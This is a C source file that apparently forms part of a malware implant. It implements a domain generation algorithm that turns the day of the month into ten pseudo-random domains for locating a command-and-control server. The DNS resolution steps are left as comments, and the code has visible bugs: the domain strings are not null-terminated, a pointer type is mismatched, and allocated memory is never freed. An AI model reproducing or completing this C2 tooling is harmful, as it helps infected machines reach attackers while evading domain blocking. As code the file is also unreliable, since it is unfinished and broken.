// Patrick Sacchet
// Calculate our DGAs and attempt to resolve them via DNS

#include "DGA.h"


// Calculate our seed we will use in our DGA 
int generateSeed(int day, int *seed)
{
    int status = 1;
    char letter;

    letter = rand_letters[day];
    *seed = (int)letter;


cleanup:
    return status;
}


// Using our seed we will construct AGDs to put into our array
int generateAGDs(int seed, char*** agds)
{
    int status = 1, tldIndex = 0, offsetAdd = 0, count = 0;

    while (count < 10)
    {
        int agdCount = 0;
        char agd [30]; // longest string would hypothetically be 22, but just in case...

        memset(agd, 0, sizeof(agd));

        while (agdCount < 10)
        {
            int offset = 0;

            if (seed + offsetAdd > RAND_SIZE)
            {
                offset = seed - offsetAdd;
            }

            else
            {
                offset = seed + offsetAdd;
            }

            memcpy(&agd[agdCount], &rand_letters[offset], 1);
            agdCount += 1;

            if (offsetAdd == 127)
            {
                offsetAdd = 0;
            }

            else
            {
                offsetAdd += 1;
            }
        }

        if (tldIndex > 4)
        {
            tldIndex = 0; // Reset our TLD index
        }

        // Append our TLD 
        memcpy(&agd[agdCount], tlds[tldIndex], strlen(tlds[tldIndex]));
        agdCount += strlen(tlds[tldIndex]);
        tldIndex += 1;
        
        // Allocate for agds entry
        agds[count] = (char*) malloc(sizeof(char) * strlen(agd));
        if (agds[count] == NULL)
        {
            printf("OOM!\n");
            status = 0;
            goto cleanup;
        }

        memcpy(agds[count], agd, strlen(agd));
        count += 1;
    }


cleanup:
    return status;
}


// Walk through our list of DGAs, attempt to resolve each name 
int resolveAddress(char** address)
{
    int status = 1;

    // Walk through our entries; if entire list doesnt resolve then wait 5 seconds before trying again 


cleanup:
    return status;
}


// Main call-in for DGA/domain resolution functionality 
int determineC2Address(char** address)
{
    int status = 1, seed = 0, day = 0 ;
    time_t now = time(NULL); // current time now
    struct tm *t = localtime(&now); // convert to local time structure
    char* agds [10] = { 0 };

    // Calculate our seed
    if (!generateSeed(t->tm_mday, &seed))
    {
        printf("Failed to calculate seed!\n");
        status = 0;
        goto cleanup;
    }

    printf("Seed is %d\n", seed);

    // Generate our AGDs
    if (!generateAGDs(seed, &agds))
    {
        printf("Failed to generate AGDs!\n");
        status = 0;
        goto cleanup;
    }

    else
    {
        printf("Generated AGDs:\n");
        for (int i=0; i< 10; i++)
        {
            printf("\t%s\n", agds[i]);            
        }
    }

    // Try to resolve each via DNS; sleep if fail all, then retry 


cleanup:
    // Free agds memory 
    return status;
}